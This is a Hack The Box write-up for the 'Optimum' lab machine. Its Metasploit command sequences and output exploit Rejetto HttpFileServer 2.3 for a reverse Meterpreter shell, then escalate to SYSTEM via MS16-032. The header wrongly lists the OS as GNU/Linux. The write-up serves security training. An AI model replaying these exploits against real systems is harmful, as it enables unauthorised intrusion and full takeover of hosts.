# htb-optimum
This is my [Hack the box](https://www.hackthebox.eu/)'s Optimum write-up.

## Machine
OS: GNU/Linux

IP: 10.10.10.8

Difficulty: Easy

## Initial enumeration
[Nmap](https://github.com/nmap/nmap) scan on the target:

`nmap -sV -sC -oN nibbles.nmap $OPTIMUM`

Flags:
 - `-sV`: Version detection
 - `-sC`: Script scan using the default set of scripts
 - `-oN`: Output in normal nmap format
 
```
# Nmap 7.80 scan initiated Thu Sep 10 12:57:37 2020 as: nmap -sC -sV -oA optimum $OPTIMUM
Nmap scan report for 10.10.10.8 (10.10.10.8)
Host is up (0.17s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 10 12:58:02 2020 -- 1 IP address (1 host up) scanned in 24.87 seconds
```

Search service using metasploit:
```
msf5 > search httpfileserver

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```

Select exploit and get info:
```
msf5 > use exploit/windows/http/rejetto_hfs_exec

msf5 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

Set options and execute exploit:
```
msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
RHOSTS => 10.10.10.8
msf5 exploit(windows/http/rejetto_hfs_exec) > set SRVPORT 9090
SRVPORT => 9090


msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.14.7:4444 
[*] Using URL: http://0.0.0.0:9090/nIWuYAuClzC
[*] Local IP: http://10.0.2.15:9090/nIWuYAuClzC
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /nIWuYAuClzC
[*] Sending stage (176195 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.10.8:49162) at 2020-09-14 12:43:07 -0400
[!] Tried to delete %TEMP%\zRnlXqR.vbs, unknown result
[*] Server stopped.

meterpreter > 
```

A meterpreter sessions is created. System info:
```
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
```

User info:
```
meterpreter > shell
sProcess 2416 created.
Channel 9 created.
wMicrosoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
optimum\kostas
```
User flag is already accessible.

Now, let's escalate privileges to get a system shell using the exploit `windows/local/ms16_032_secondary_logon_handle_privesc`:
```       
msf5 > use windows/local/ms16_032_secondary_logon_handle_privesc                                             
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options                                
                                                                                                             
Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):                              
                                                                                                             
   Name     Current Setting  Required  Description                                                           
   ----     ---------------  --------  -----------                                                           
   SESSION  2                yes       The session to run this module on.                                    
                                                                                                             
                                                                                                             
Payload options (windows/meterpreter/reverse_tcp):                                                           
                                                                                                             
   Name      Current Setting  Required  Description                                                          
   ----      ---------------  --------  -----------                                                          
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)            
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)                   
   LPORT     4444             yes       The listen port                                                      
                                                                                                             
                                                                                                             
Exploit target:                                                                                              

   Id  Name
   --  ----
   0   Windows x86


msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 10.10.14.7
LHOST => 10.10.14.7
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.10.14.7:4444 
[+] Compressed size: 1016
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\aKHDVWAoWwaap.ps1...
[*] Compressing script contents...
[+] Compressed size: 3600
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1384

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1392
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

eUsxLBX8akwHjJTGQPDj8lbod2fRMyz6
[+] Executed on target machine.
[*] Sending stage (176195 bytes) to 10.10.10.8
[*] Meterpreter session 3 opened (10.10.14.7:4444 -> 10.10.10.8:49169) at 2020-09-14 13:12:19 -0400
[+] Deleted C:\Users\kostas\AppData\Local\Temp\aKHDVWAoWwaap.ps1

meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > shell
Process 1648 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```

And that's it, the root flag will be available at `C:\Users\Administrator\Desktop`.
